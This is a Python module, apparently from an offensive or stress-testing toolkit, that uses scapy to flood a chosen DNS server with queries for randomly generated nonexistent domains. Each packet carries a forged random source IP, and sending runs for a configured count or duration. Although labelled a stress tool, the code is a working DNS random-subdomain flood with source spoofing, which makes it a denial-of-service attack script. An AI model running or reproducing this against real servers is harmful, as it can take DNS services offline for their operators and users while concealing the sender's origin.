from scapy.all import *

import lib.ColorPrint as cp
from lib.EZData import *
from lib.cmd_tool import *

NAME = 'DnsNxDomain'

class Module:
    def __init__(self):
        self.config = {
            'IP': {
                'value': '',
                'help': 'DNS server ip.',
            },
            'Ports': {
                'value': '53',
                'help': 'DNS server port.',
            },
            'Count': {
                'value': '100',
                'help': 'DNS query count.',
            },
            'LabelLength': {
                'value': '10',
                'help': 'Length of each label.\nfor example: www3.hereisthetest.com\n\tLength for each label is: 4, 13 and 3.'
            },
            'LabelCount': {
                'value': '4',
                'help': 'Label count.\nfor example: mail.xxx.hereisthetest.com\n\tLabel count is 4.'
            },
            'Time': {
                'value': '10',
                'help': 'Stop sending query after specified time.',
            },
            'Mode': {
                'value': '0',
                'help': 'Run method.',
                'option': {
                    MODE_COUNT: '',
                    MODE_TIME: '',
                },
            }
        }

        self.help = 'A stress tool for DNS server. Request random DNS query to specified DNS server.'

    def validate(self) -> bool:
        
        return True

    def interactive(self):
        interactive(self, 'dns_nxdomain')

    def create_domain(self) -> str:
        nLabelLen = int(get_value(self.config, 'LabelLength'))
        nLabelCnt = int(get_value(self.config, 'LabelCount'))

        return '.'.join(randomStr(nLabelLen) for _ in range(nLabelCnt))

    def run(self):
        try:
            def send_dns(ip: str, port: int = 53):
                fake_srcIP = randIP()
                pktDNS = IP(src=fake_srcIP, dst=ip) / \
                UDP(sport=randInt(), dport=port) / \
                DNS(rd=1, qd=DNSQR(qname=self.create_domain(), qtype='A'))

                send(pktDNS, verbose=False)

            lsIP = str2strls(get_value(self.config, 'IP'))
            lsPort = str2intls(get_value(self.config, 'Ports'))
            nCnt = int(get_value(self.config, 'Count'))
            nTime = int(get_value(self.config, 'Time'))
            nMode = int(get_value(self.config, 'Mode'))

            total = 0

            if nMode == MODE_COUNT:
                for ip in lsIP:
                    for port in lsPort:
                        for _ in range(0, nCnt):
                            send_dns(ip, port)
                            total += 1
            
            elif nMode == MODE_TIME:
                for ip in lsIP:
                    for port in lsPort:
                        total = doWorkWithSeconds(send_dns, nTime, {'ip': ip, 'port': port})
            
            cp.pf_ok(f'Done, total={total}')

        except Exception as ex:
            cp.pf_failed(str(ex))